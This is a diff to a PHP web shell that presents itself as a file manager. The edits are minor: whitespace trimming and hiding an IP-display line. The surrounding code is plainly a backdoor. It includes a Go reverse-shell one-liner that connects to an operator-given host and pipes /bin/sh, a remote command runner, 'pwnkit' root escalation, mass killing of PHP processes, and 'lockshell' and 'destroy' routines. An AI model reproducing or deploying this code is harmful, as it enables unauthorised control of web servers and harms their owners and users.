@@ -6,7 +6,7 @@
 @ini_set('max_execution_time', 0);
 @ini_set('output_buffering', 0);
 @ini_set('display_errors', 0);
-# function WAF 
+# function WAF
 // file_manager.php
 session_start();
 
@@ -737,7 +737,7 @@ if ($_GET['don'] == true) {
         <ul>
             <li><i class="fa-solid fa-computer"></i>&nbsp;<?= $fungsi[8](); ?></li>
             <li><i class="fa-solid fa-server"></i>&nbsp;<?= $_SERVER["SERVER_SOFTWARE"]; ?></li>
-            <li><i class="fa-solid fa-network-wired"></i>&nbsp;: <?= gethostbyname($_SERVER["SERVER_ADDR"]); ?> |&nbsp;: <?= $_SERVER["REMOTE_ADDR"]; ?></li>
+            <!-- <li><i class="fa-solid fa-network-wired"></i>&nbsp;: <?= gethostbyname($_SERVER["SERVER_ADDR"]); ?> |&nbsp;: <?= $_SERVER["REMOTE_ADDR"]; ?></li> -->
             <li><i class="fa-solid fa-globe"></i>&nbsp;<?= s(); ?></li>
             <li><i class="fa-brands fa-php"></i>&nbsp;<?= PHP_VERSION; ?></li>
             <li><i class="fa-solid fa-user"></i>&nbsp;<?= $fungsi[9](); ?></li>
@@ -1238,8 +1238,6 @@ if (isset($_POST['submitwp'])) {
     $conn->close();
 }
 
-
-
 if (isset($_GET['unlockshell'])) {
     if (cmd("killall -9 php") && cmd("pkill -9 php")) {
         success();
@@ -1271,8 +1269,6 @@ if (isset($_POST['submit-bc'])) {
         echo cmd('echo \'package main;import"os/' . $fungsi[16] . '";import"net";func main(){c,_:=net.Dial("tcp","' . $HostServer . ':' . $PortServer . '");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go');
     }
 }
-
-
 
 if (isset($_GET['lockshell'])) {
     $curFile = trim(basename($_SERVER["SCRIPT_FILENAME"]));
@@ -1350,7 +1346,6 @@ if (isset($_GET['destroy'])) {
     }
 }
 
-
 if (isset($_POST['save-editor'])) {
     $save = $fungsi[28]($fungsi[0]() . "/" . unx($_GET['f']), $_POST['code-editor']);
     if ($save) {
@@ -1367,7 +1362,6 @@ if (isset($_GET['adminer'])) {
         echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '">';
     }
 }
-
 
 if ($_GET['terminal'] == "root") {
     if (!$fungsi[3]('pwnkit') && $fungsi[4]($fungsi[0]())) {
@@ -1570,7 +1564,6 @@ Swal.fire({
     </script>";
 }
 
-
 function success()
 {
     echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($GLOBALS['fungsi'][0]()) . '&response=success">';
@@ -1586,7 +1579,6 @@ function formatSize($bytes)
     for ($i = 0; $bytes >= 1024 && $i < (count($types) - 1); $bytes /= 1024, $i++);
     return (round($bytes, 2) . " " . $types[$i]);
 }
-
 
 function hx($n)
 {
@@ -1671,7 +1663,6 @@ function cmd($in, $re = false)
     return $out;
 }
 
-
 function winpwd()
 {
     return str_replace("\\", "/", $GLOBALS['fungsi'][0]());
@@ -1742,7 +1733,6 @@ function remove_dot($file)
     $pch = explode(".", $FILES);
     return $pch[0];
 }
-
 
 function windowsDriver()
 {
